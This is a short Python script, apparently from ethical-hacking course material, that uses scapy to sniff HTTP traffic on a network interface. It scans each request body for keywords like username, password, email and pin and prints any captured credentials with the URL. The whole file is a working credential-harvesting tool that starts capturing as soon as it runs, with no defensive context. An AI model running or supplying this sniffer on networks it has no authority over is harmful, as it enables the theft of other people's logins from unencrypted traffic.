#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url.decode('utf-8')  # Decode bytes to string for compatibility

def get_login_info(packet):
    url = get_url(packet)
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        if isinstance(load, bytes):  # Ensure load is decoded to string
            load = load.decode('utf-8', errors='ignore')
        keywords = ["username", "uname", "user", "pass", "password", "email", "pin"]
        for keyword in keywords:
            if keyword in load:
                return load, url

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        login_info = get_login_info(packet)
        if login_info:  # Ensure login_info is not None
            print("---" * 20)
            print("Login Credential Found!!\n")
            print("[+] HTTP Request " + login_info[1])
            print(login_info[0])
            print("---" * 20)

# Replace "eth0" with your actual network interface name if different.
sniff("eth0")
